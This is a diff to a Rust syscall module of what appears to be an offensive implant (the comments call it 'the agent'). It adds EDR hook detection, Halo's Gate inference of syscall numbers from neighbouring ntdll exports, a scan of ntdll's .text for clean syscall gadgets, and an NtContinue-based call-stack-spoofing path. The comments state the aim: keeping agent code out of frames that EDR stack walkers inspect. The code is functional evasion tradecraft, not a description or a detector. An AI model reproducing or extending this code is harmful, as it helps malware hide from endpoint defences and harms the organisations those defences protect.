@@ -31,6 +31,14 @@ static SYSCALL_CACHE: OnceLock<Mutex<HashMap<String, (u32, usize)>>> = OnceLock:
 #[cfg(all(windows, feature = "stack-spoof"))]
 static NTDLL_SPOOF_FRAME: OnceLock<usize> = OnceLock::new();
 
+/// Cached SSN for `NtContinue`.
+///
+/// Used by the NtContinue-based stack-spoof dispatch path to call NtContinue
+/// directly via `syscall` without going through `do_syscall` recursively.
+/// 0 means unresolved or unavailable (fall back to `jmp`-based path).
+#[cfg(all(windows, feature = "stack-spoof", target_arch = "x86_64"))]
+static NTCONTINUE_SSN: OnceLock<u32> = OnceLock::new();
+
 #[cfg(windows)]
 #[derive(Clone, Copy, Debug)]
 pub struct SyscallTarget {
@@ -66,7 +74,11 @@ pub struct SyscallTarget {
 #[cfg(windows)]
 fn parse_syscall_stub(func_addr: usize) -> Option<SyscallTarget> {
     unsafe {
-        let bytes = std::slice::from_raw_parts(func_addr as *const u8, 32);
+        // Scan up to 64 bytes.  Most unhooked stubs reach `syscall` within
+        // 8 bytes; 64 gives headroom for padded variants.  When an EDR hooks
+        // at offset 0, none of the bytes will contain 0x0F 0x05, so this
+        // function returns None and the Halo's Gate fallback takes over.
+        let bytes = std::slice::from_raw_parts(func_addr as *const u8, 64);
         for j in 0..bytes.len().saturating_sub(1) {
             if bytes[j] == 0x0f && bytes[j + 1] == 0x05 {
                 // syscall gadget
@@ -86,6 +98,179 @@ fn parse_syscall_stub(func_addr: usize) -> Option<SyscallTarget> {
     }
 }
 
+/// Collect the virtual addresses of all `Nt`-prefixed exports from the loaded
+/// module at `module_base`.  These represent the NT syscall stubs (or their
+/// hooked replacements); only the addresses matter — callers sort them by VA
+/// to approximate the monotonically-increasing SSN order used by Windows.
+///
+/// Returns an empty `Vec` if the PE export directory cannot be read.
+#[cfg(windows)]
+unsafe fn collect_nt_export_vas(module_base: usize) -> Vec<usize> {
+    use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY, IMAGE_NT_HEADERS64};
+
+    let dos = &*(module_base as *const IMAGE_DOS_HEADER);
+    if dos.e_magic != 0x5A4D {
+        return Vec::new(); // not a valid PE
+    }
+    let nt = &*((module_base + dos.e_lfanew as usize) as *const IMAGE_NT_HEADERS64);
+    let export_rva = nt.OptionalHeader.DataDirectory[0].VirtualAddress as usize;
+    let export_size = nt.OptionalHeader.DataDirectory[0].Size as usize;
+    if export_rva == 0 || export_size == 0 {
+        return Vec::new();
+    }
+
+    let dir = &*((module_base + export_rva) as *const IMAGE_EXPORT_DIRECTORY);
+    let n_names = dir.NumberOfNames as usize;
+    if n_names == 0 {
+        return Vec::new();
+    }
+
+    let name_rvas = std::slice::from_raw_parts(
+        (module_base + dir.AddressOfNames as usize) as *const u32,
+        n_names,
+    );
+    let ordinals = std::slice::from_raw_parts(
+        (module_base + dir.AddressOfNameOrdinals as usize) as *const u16,
+        n_names,
+    );
+    let func_rvas = std::slice::from_raw_parts(
+        (module_base + dir.AddressOfFunctions as usize) as *const u32,
+        dir.NumberOfFunctions as usize,
+    );
+
+    let mut result = Vec::new();
+    for i in 0..n_names {
+        let name_ptr = (module_base + name_rvas[i] as usize) as *const u8;
+        // Accept only "Nt" followed by an uppercase letter — the signature of
+        // NT syscall stubs.  This excludes "NtdllDefWindowProc" and similar
+        // helper exports that are not syscall stubs.
+        if *name_ptr != b'N' || *name_ptr.add(1) != b't' {
+            continue;
+        }
+        if !(*name_ptr.add(2)).is_ascii_uppercase() {
+            continue;
+        }
+
+        let ord = ordinals[i] as usize;
+        if ord >= func_rvas.len() {
+            continue;
+        }
+        let func_rva = func_rvas[ord] as usize;
+        // Skip forwarded exports (RVA falls inside the export directory).
+        if func_rva >= export_rva && func_rva < export_rva + export_size {
+            continue;
+        }
+        result.push(module_base + func_rva);
+    }
+    result
+}
+
+/// Infer the SSN for a function at `target_addr` in `ntdll_base` using the
+/// **Halo's Gate** technique.
+///
+/// Windows NT assigns syscall numbers in monotonically-increasing order when
+/// `Nt*` exports are sorted by virtual address.  If `target_addr` is hooked
+/// by an EDR (so `parse_syscall_stub` returns `None`), we sort all `Nt*` VAs,
+/// locate the target's position, then scan outward through adjacent entries
+/// for the first one whose stub is parseable.  The target's SSN is then:
+///
+///   inferred_ssn = neighbour_ssn ∓ distance
+///
+/// The `gadget_addr` field of the returned `SyscallTarget` is taken from the
+/// neighbour's stub; callers that subsequently call `map_clean_ntdll` (which
+/// performs its own gadget scan) ignore this field anyway.
+///
+/// Returns `None` if no parseable neighbour is found within 8 slots.
+#[cfg(windows)]
+unsafe fn infer_ssn_halo_gate(ntdll_base: usize, target_addr: usize) -> Option<SyscallTarget> {
+    let mut vas = collect_nt_export_vas(ntdll_base);
+    if vas.is_empty() {
+        return None;
+    }
+    vas.sort_unstable();
+
+    let target_idx = vas.iter().position(|&va| va == target_addr)?;
+
+    const MAX_DELTA: usize = 8;
+    for delta in 1..=MAX_DELTA {
+        // Higher-VA neighbour → higher SSN: inferred = neighbour_ssn - delta.
+        if let Some(&upper_va) = vas.get(target_idx + delta) {
+            if let Some(t) = parse_syscall_stub(upper_va) {
+                if let Some(inferred) = t.ssn.checked_sub(delta as u32) {
+                    log::debug!(
+                        "halo_gate: SSN {} inferred for {:#x} (upper+{} SSN={})",
+                        inferred, target_addr, delta, t.ssn
+                    );
+                    return Some(SyscallTarget { ssn: inferred, gadget_addr: t.gadget_addr });
+                }
+            }
+        }
+        // Lower-VA neighbour → lower SSN: inferred = neighbour_ssn + delta.
+        if delta <= target_idx {
+            if let Some(t) = parse_syscall_stub(vas[target_idx - delta]) {
+                let inferred = t.ssn + delta as u32;
+                log::debug!(
+                    "halo_gate: SSN {} inferred for {:#x} (lower-{} SSN={})",
+                    inferred, target_addr, delta, t.ssn
+                );
+                return Some(SyscallTarget { ssn: inferred, gadget_addr: t.gadget_addr });
+            }
+        }
+    }
+    log::warn!(
+        "halo_gate: could not infer SSN for {:#x} within {} neighbours",
+        target_addr, MAX_DELTA
+    );
+    None
+}
+
+/// Scan the `.text` section of the ntdll module loaded at `ntdll_base` for a
+/// valid `syscall` (or `syscall; ret`) gadget.  Returns the address of the
+/// first valid gadget found, or `None` if no valid gadget exists.
+///
+/// Called from `get_bootstrap_ssn` when the target Nt* stub is found to be
+/// hooked so that the returned `SyscallTarget` carries a clean, unhooked
+/// gadget address rather than the EDR-controlled trampoline address.
+#[cfg(windows)]
+unsafe fn scan_text_for_syscall_gadget(ntdll_base: usize) -> Option<usize> {
+    use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER};
+
+    let dos = &*(ntdll_base as *const IMAGE_DOS_HEADER);
+    if dos.e_magic != 0x5A4D {
+        return None;
+    }
+    let nt = &*((ntdll_base + dos.e_lfanew as usize) as *const IMAGE_NT_HEADERS64);
+    let p_sections = (nt as *const _ as usize
+        + std::mem::size_of::<IMAGE_NT_HEADERS64>())
+        as *const IMAGE_SECTION_HEADER;
+
+    for i in 0..nt.FileHeader.NumberOfSections {
+        let section = &*p_sections.add(i as usize);
+        let name = &section.Name;
+        if name[0] == b'.'
+            && name[1] == b't'
+            && name[2] == b'e'
+            && name[3] == b'x'
+            && name[4] == b't'
+        {
+            let start = ntdll_base + section.VirtualAddress as usize;
+            let size = *section.Misc.VirtualSize() as usize;
+            let code = std::slice::from_raw_parts(start as *const u8, size);
+            for j in 0..size.saturating_sub(3) {
+                if code[j] == 0x0f && code[j + 1] == 0x05 {
+                    let candidate = start + j;
+                    let gadget_len = if code[j + 2] == 0xc3 { 3 } else { 2 };
+                    if gadget_is_valid(candidate, gadget_len) {
+                        return Some(candidate);
+                    }
+                }
+            }
+            break;
+        }
+    }
+    None
+}
+
 #[cfg(windows)]
 fn get_bootstrap_ssn(func_name: &str) -> Option<SyscallTarget> {
     unsafe {
@@ -96,7 +281,59 @@ fn get_bootstrap_ssn(func_name: &str) -> Option<SyscallTarget> {
         name.push(0);
         let target_hash = pe_resolve::hash_str(&name);
         let func_addr = pe_resolve::get_proc_address_by_hash(ntdll_base, target_hash)?;
-        parse_syscall_stub(func_addr)
+
+        // Explicit hook detection: inspect the first two bytes of the resolved
+        // stub.  All unhooked 64-bit Nt* stubs start with one of:
+        //   0x4C 0x8B D1   — MOV R10, RCX (REX.W prefix; standard syscall stub)
+        //   0xB8 xx xx xx  — MOV EAX, <SSN> (less common direct-load variant)
+        // An EDR hook typically overwrites byte 0 with a JMP (0xE9), PUSH, or
+        // INT3 trampoline, so any other pattern implies an active hook.
+        let prologue = std::slice::from_raw_parts(func_addr as *const u8, 2);
+        let is_hooked = !(
+            (prologue[0] == 0x4C && prologue[1] == 0x8B) // MOV R10, RCX
+            || prologue[0] == 0xB8                        // MOV EAX, imm32
+        );
+
+        if !is_hooked {
+            // Fast path: stub is unhooked; SSN is directly readable.
+            if let Some(t) = parse_syscall_stub(func_addr) {
+                return Some(t);
+            }
+        }
+
+        // Hook detected (or parse failed on an unhooked stub).
+        // Infer the SSN via Halo's Gate, then locate an unhooked
+        // `syscall; ret` gadget in the loaded ntdll's .text section so the
+        // returned gadget_addr is not inside an EDR-controlled trampoline.
+        if is_hooked {
+            log::warn!(
+                "get_bootstrap_ssn: {func_name} stub appears hooked \
+                 (prologue: {:#04x} {:#04x}); using Halo's Gate + .text gadget scan",
+                prologue[0],
+                prologue[1]
+            );
+        } else {
+            log::warn!(
+                "get_bootstrap_ssn: {func_name} stub prologue looks clean but \
+                 parse_syscall_stub failed; falling back to Halo's Gate"
+            );
+        }
+
+        let ssn_target = infer_ssn_halo_gate(ntdll_base, func_addr)?;
+
+        if is_hooked {
+            // Replace the neighbour gadget_addr with one from a direct .text
+            // scan, ensuring the syscall instruction is not in a trampoline.
+            if let Some(gadget_addr) = scan_text_for_syscall_gadget(ntdll_base) {
+                return Some(SyscallTarget { ssn: ssn_target.ssn, gadget_addr });
+            }
+            log::warn!(
+                "get_bootstrap_ssn: {func_name}: no clean syscall;ret gadget found \
+                 in ntdll .text; using Halo's Gate neighbour gadget as fallback"
+            );
+        }
+
+        Some(ssn_target)
     }
 }
 
@@ -271,11 +508,25 @@ pub fn get_syscall_id(func_name: &str) -> Result<SyscallTarget> {
     }
 
     let base = *CLEAN_NTDLL.get_or_init(|| {
-        map_clean_ntdll().unwrap_or_else(|e| {
-            tracing::error!("Fatal: Could not map clean ntdll.dll: {e}");
-            std::process::exit(1);
-        })
+        match map_clean_ntdll() {
+            Ok(b) => b,
+            Err(e) => {
+                // Do NOT call process::exit — a hooked or unavailable stub
+                // should degrade gracefully.  Callers already use `?` so the
+                // returned Err below propagates without crashing the agent.
+                log::warn!(
+                    "get_syscall_id: could not map clean ntdll.dll: {e}; \
+                     direct-syscall SSN resolution will fail for this session"
+                );
+                0 // sentinel: mapping unavailable
+            }
+        }
     });
+    if base == 0 {
+        return Err(anyhow!(
+            "clean ntdll mapping unavailable; cannot resolve SSN for '{func_name}'"
+        ));
+    }
 
     let target = read_export_dir(base, func_name)?;
     cache_lock
@@ -334,6 +585,39 @@ fn find_ntdll_spoof_frame() -> usize {
             }
         }
         0
+    }
+}
+
+/// Resolve the SSN for `NtContinue` from the clean ntdll mapping.
+///
+/// This SSN is used by the NtContinue-based stack-spoof path to dispatch
+/// NtContinue directly via a raw `syscall` instruction, avoiding any
+/// recursive call into `do_syscall`.
+///
+/// Returns 0 if the SSN cannot be resolved (signals the caller to fall back
+/// to the `jmp`-based spoof path).
+#[cfg(all(windows, feature = "stack-spoof", target_arch = "x86_64"))]
+fn resolve_ntcontinue_ssn() -> u32 {
+    // We need the clean ntdll base to be already mapped; use the same
+    // initialisation path as get_syscall_id.  If it hasn't been mapped yet
+    // we cannot proceed without risking deadlock (we may be called from a
+    // context where map_clean_ntdll has not run).
+    let base = match CLEAN_NTDLL.get() {
+        Some(&b) if b != 0 => b,
+        _ => {
+            // Fall back to the loaded (potentially hooked) ntdll export.
+            // If it is hooked the SSN will still be correct because the
+            // hooking framework only patches the first bytes, not the
+            // encoded syscall number.
+            match get_bootstrap_ssn("NtContinue") {
+                Some(t) => return t.ssn,
+                None => return 0,
+            }
+        }
+    };
+    match read_export_dir(base, "NtContinue") {
+        Ok(t) => t.ssn,
+        Err(_) => 0,
     }
 }
 
@@ -427,6 +711,154 @@ pub unsafe fn do_syscall(ssn: u32, gadget_addr: usize, args: &[u64]) -> i32 {
             *NTDLL_SPOOF_FRAME.get_or_init(|| find_ntdll_spoof_frame());
         #[cfg(not(feature = "stack-spoof"))]
         let spoof_frame: usize = 0;
+
+        // ── NtContinue-based stack-spoof dispatch ─────────────────────────
+        // When both `spoof_frame` and `NtContinue`'s SSN are available we use
+        // a fundamentally different dispatch strategy that closes the APC race
+        // window present in the simple `jmp r11` approach:
+        //
+        // Problem with `jmp r11`:
+        //   After we push the fake return chain and execute `jmp r11`, if the
+        //   kernel delivers an APC or exception between the `jmp` and the
+        //   `syscall` instruction, the trap frame records RIP = gadget_addr
+        //   and the return address at [Rsp] as the user-mode return site.
+        //   Because we pushed `lea r15, [rip+43f]` (agent code) as the second
+        //   frame, advanced EDR stack walkers can see an agent-code address one
+        //   level above the ntdll spoof frame.
+        //
+        // NtContinue solution:
+        //   Instead of manipulating the stack in user mode and jumping to the
+        //   gadget, we build a CONTEXT record that describes where execution
+        //   should resume (Rip = syscall gadget, all argument registers set,
+        //   Rsp pointing to a stack that has [spoof_frame, continuation] on
+        //   top) and call NtContinue via a direct `syscall` instruction.
+        //   The kernel itself then performs the context switch.  Any trap frame
+        //   the kernel constructs during APC delivery or exception dispatch
+        //   between our `syscall` (for NtContinue) and the eventual `syscall`
+        //   instruction at the gadget will show Rsp→spoof_frame (ntdll) as the
+        //   user-mode return address — agent code never appears in any
+        //   kernel-visible frame.
+        //
+        // The NtContinue call itself is made via a bare `syscall` instruction
+        // in inline asm (no further stack manipulation) so there is no
+        // recursive spoof nesting.
+        #[cfg(all(feature = "stack-spoof", target_arch = "x86_64"))]
+        if spoof_frame != 0 {
+            use winapi::um::winnt::{CONTEXT, CONTEXT_INTEGER, CONTEXT_CONTROL};
+
+            let ntcontinue_ssn: u32 =
+                *NTCONTINUE_SSN.get_or_init(|| resolve_ntcontinue_ssn());
+
+            if ntcontinue_ssn != 0 {
+                // ── Spoofed call stack layout for the target syscall ─────────
+                //
+                // When the kernel restores our CONTEXT and resumes at the
+                // `syscall; ret` gadget, ctx.Rsp must satisfy:
+                //
+                //   [Rsp + 0x00]  return address  ← spoof_frame (ntdll ret gadget)
+                //   [Rsp + 0x08]  shadow home rcx  ← continuation (popped by spoof_frame ret)
+                //   [Rsp + 0x10]  shadow home rdx  (zeroed; never read by kernel for syscalls)
+                //   [Rsp + 0x18]  shadow home r8   (zeroed; never read by kernel for syscalls)
+                //   [Rsp + 0x20]  shadow home r9   (zeroed; never read by kernel for syscalls)
+                //   [Rsp + 0x28]  arg 5            (if nstack >= 1)
+                //   [Rsp + 0x30]  arg 6            ...
+                //
+                // Execution trace:
+                //   NtContinue restores ctx → CPU executes `syscall` at gadget
+                //   → kernel handles target syscall
+                //   → gadget `ret` pops [Rsp+0x00] = spoof_frame  (rsp += 8)
+                //   → spoof_frame `ret` pops [new_rsp] = continuation (rsp += 8)
+                //   → resumes at label 2: with RAX = target syscall NTSTATUS
+                //
+                // Why shadow[0] (Rsp+0x08) can hold continuation:
+                //   Shadow slots are pre-allocated by the *caller* for the
+                //   callee to optionally spill register args.  The NT kernel's
+                //   syscall dispatch path never reads them for dispatching.
+                //   Re-using shadow[0] for the continuation avoids adding any
+                //   extra slots and keeps the 5th-arg offset at [Rsp+0x28].
+                //
+                // Layout (Vec indices):
+                //   [0]           = spoof_frame
+                //   [1]           = continuation  (shadow[0] slot — filled from asm)
+                //   [2..4]        = shadow[1..3]  (zeroed)
+                //   [5..5+nstack] = stack args    (args[4..])
+                let frame_elems = 5 + nstack;
+                let mut spoof_frame_buf: Vec<u64> = vec![0u64; frame_elems];
+                spoof_frame_buf[0] = spoof_frame as u64;
+                // [1] = continuation — filled from asm below.
+                // [2..4] remain zero (shadow[1..3]).
+                for i in 0..nstack {
+                    spoof_frame_buf[5 + i] = unsafe { *stack_ptr.add(i) };
+                }
+                let cont_slot_ptr: *mut u64 = &mut spoof_frame_buf[1];
+
+                // Build the CONTEXT (zero-init).  CONTEXT_INTEGER | CONTEXT_CONTROL
+                // is sufficient for NtContinue to restore all integer registers and
+                // control-flow state without touching floating-point state.
+                //
+                // CONTEXT must be 16-byte aligned (Windows ABI requirement).
+                // winapi's CONTEXT lacks #[repr(align(16))]; we over-allocate
+                // by 15 bytes and align the pointer manually.
+                let ctx_size = std::mem::size_of::<CONTEXT>();
+                let mut ctx_storage: Vec<u8> = vec![0u8; ctx_size + 15];
+                let ctx_ptr_raw = ctx_storage.as_mut_ptr() as usize;
+                let ctx_ptr_aligned = (ctx_ptr_raw + 15) & !15usize;
+                let ctx: &mut CONTEXT =
+                    unsafe { &mut *(ctx_ptr_aligned as *mut CONTEXT) };
+
+                ctx.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL;
+                ctx.Rax = ssn as u64;
+                ctx.Rcx = a1;
+                ctx.Rdx = a2;
+                ctx.R8  = a3;
+                ctx.R9  = a4;
+                ctx.R10 = a1;  // NT syscall ABI: R10 = RCX at entry
+                ctx.Rip = gadget_addr as u64;
+                // Rsp → spoof_frame_buf[0]; gadget `ret` pops buf[0]=spoof_frame,
+                // then spoof_frame `ret` pops buf[1]=continuation.
+                ctx.Rsp = spoof_frame_buf.as_ptr() as u64;
+
+                // ── Dispatch via a bare `syscall` for NtContinue ─────────────
+                // No stack manipulation here.  The kernel restores our CONTEXT;
+                // any trap frame it constructs before the target `syscall`
+                // executes will show ctx.Rsp→spoof_frame (ntdll) as the
+                // user-mode return site — agent code never appears.
+                let nt_status: i32;
+                unsafe {
+                    asm!(
+                        // Fill in the continuation address at spoof_frame_buf[1].
+                        "lea r15, [rip + 2f]",
+                        "mov [{cont_slot}], r15",
+                        // NtContinue arguments (Windows x64 syscall ABI):
+                        //   RCX / R10 = PCONTEXT
+                        //   RDX       = TestAlert (FALSE = 0)
+                        //   EAX       = SSN
+                        "mov rcx, {ctx_ptr}",
+                        "xor rdx, rdx",
+                        "mov r10, rcx",
+                        "mov eax, {ntc_ssn:e}",
+                        // Direct syscall — no fake frames, no jmp.
+                        "syscall",
+                        // ── Continuation ──────────────────────────────────────
+                        // Reached after: gadget ret → spoof_frame ret → here.
+                        // RAX holds the NTSTATUS from the target syscall.
+                        "2:",
+                        ctx_ptr   = in(reg) ctx_ptr_aligned as u64,
+                        cont_slot = in(reg) cont_slot_ptr as u64,
+                        ntc_ssn   = in(reg) ntcontinue_ssn,
+                        lateout("rax") nt_status,
+                        out("rcx") _, out("rdx") _, out("r10") _, out("r11") _,
+                        out("r15") _,
+                    );
+                }
+                // Keep buffers live until here.
+                let _ = &spoof_frame_buf;
+                let _ = &ctx_storage;
+                return nt_status;
+            }
+            // NtContinue SSN unavailable — fall through to jmp-based spoof below.
+        }
+        // ─────────────────────────────────────────────────────────────────────
 
         // SAFETY: Register allocation constraints are explicit to guarantee that
         // `nstack` and `stack_ptr` can never share a register with `a1` or `a2`.
@@ -639,11 +1071,20 @@ pub fn map_clean_dll(dll_name: &str) -> Result<usize> {
 
     unsafe {
         let ntdll_base = *CLEAN_NTDLL.get_or_init(|| {
-            map_clean_ntdll().unwrap_or_else(|e| {
-                tracing::error!("Fatal: Could not map clean ntdll.dll: {e}");
-                std::process::exit(1);
-            })
+            match map_clean_ntdll() {
+                Ok(b) => b,
+                Err(e) => {
+                    log::warn!(
+                        "map_clean_dll: could not map clean ntdll.dll: {e}; \
+                         clean API resolution will fail for this session"
+                    );
+                    0
+                }
+            }
         });
+        if ntdll_base == 0 {
+            return Err(anyhow!("clean ntdll mapping unavailable; cannot map clean '{dll_name}'"));
+        }
 
         let sys_ntcreatesection = get_syscall_id("NtCreateSection")?;
         let sys_ntmapview = get_syscall_id("NtMapViewOfSection")?;
@@ -1289,8 +1730,8 @@ macro_rules! clean_call {
     ($dll_name:expr, $func_name:expr, $fn_type:ty $(, $args:expr)* $(,)?) => {{
         let addr = $crate::syscalls::get_clean_api_addr($dll_name, $func_name)
             .unwrap_or_else(|e| {
-                tracing::error!("Failed to resolve clean {}: {}", $func_name, e);
-                std::process::exit(1);
+                log::error!("Failed to resolve clean {}: {}", $func_name, e);
+                return Err(anyhow::anyhow!("Failed to resolve clean {}: {}", $func_name, e));
             });
         // Gather arguments
         let args: &[u64] = &[$($args as u64),*];
